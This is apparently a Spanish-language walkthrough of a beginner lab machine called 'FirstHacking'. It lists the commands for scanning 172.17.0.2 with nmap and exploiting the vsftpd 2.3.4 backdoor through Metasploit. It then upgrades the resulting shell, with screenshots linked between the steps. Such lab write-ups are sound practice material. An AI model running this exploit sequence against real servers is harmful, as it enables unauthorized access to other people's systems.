Maquina: FirstHacking

Autor: El Pinguino de Mario 

Dificultad: Muy Facil

![Screenshot 2024-11-09 084750](https://github.com/user-attachments/assets/09b2bd7c-25c8-4e51-88fd-b57217eebfd5)

ping 172.17.0.2 -c 1

![Screenshot 2024-11-09 084849](https://github.com/user-attachments/assets/ac694df8-7aa3-402d-a438-b9bbf673e6dc)

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 

![Screenshot 2024-11-09 084931](https://github.com/user-attachments/assets/3564ed2c-7a62-47c1-b5aa-b1e21fa9ce4c)

searchsploit vsftpd 2.3.4  
msfconsole -q  
search vsftpd 2.3.4 

![Screenshot 2024-11-09 084947](https://github.com/user-attachments/assets/6ba0eba3-1800-4adc-b48e-6efb89b776d4)

use 0
show options
set rhost 172.17.0.2
run

![Screenshot 2024-11-09 085434](https://github.com/user-attachments/assets/003b9874-a97f-4a19-adda-c5484db3b067)

script /dev/null -c bash
whoami

![Screenshot 2024-11-09 085503](https://github.com/user-attachments/assets/6b16bf42-4f13-4c37-8ae1-fb9cf2638232)
